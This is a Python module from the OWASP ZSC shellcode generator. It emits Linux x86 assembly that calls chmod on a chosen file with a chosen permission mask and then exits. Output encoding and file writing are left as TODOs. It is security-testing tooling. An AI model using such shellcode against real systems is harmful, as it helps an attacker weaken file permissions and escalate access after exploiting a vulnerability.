"""
OWASP ZSC
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp_zsc[at]googlegroups[dot]com ]
"""
from owasp_zsc.new_cores import base_module
from owasp_zsc.new_cores import stack
# from owasp_zsc import new_cores
# import os
# from owasp_zsc.libs.encoders import linux_x86
# from owasp_zsc.libs.opcoder.linux_x86 import convert

# encoders = new_cores.list_modules(linux_x86)


class Module(base_module.BasePayload):
    file = base_module.OptFile("", "Target file to change permission")
    permission = base_module.OptString("", "Permission mask (number)")
    out_file = base_module.OptString("", "Output .c file to write shellcode")

    def generate(self):
        payload = "push $0x0f\n"
        payload += "pop %%eax\n"
        payload += stack.generate(self.permission, '%ecx', 'int')
        payload += stack.generate(self.file, '%ebx', 'string')
        payload += "mov %%esp, %%ebx\n"
        payload += "int $0x80\n"
        payload += "mov $0x01, %%al\n"
        payload += "mov $0x01, %%bl\n"
        payload += "int $0x80"
        return payload

    def run(self):
        asm_code = ""
        if not self.permission or not self.file:
            print("Target file and file's permissions are required")
        else:
            asm_code = self.generate()
        print(asm_code)
        # TODO handle encode
        # if self.out_file:
        #     file_name, file_ext = os.path.splitext(self.out_file)
        #     if file_ext.lower() != ".c":
        #         self.out_file += ".c"
        # TODO write file here
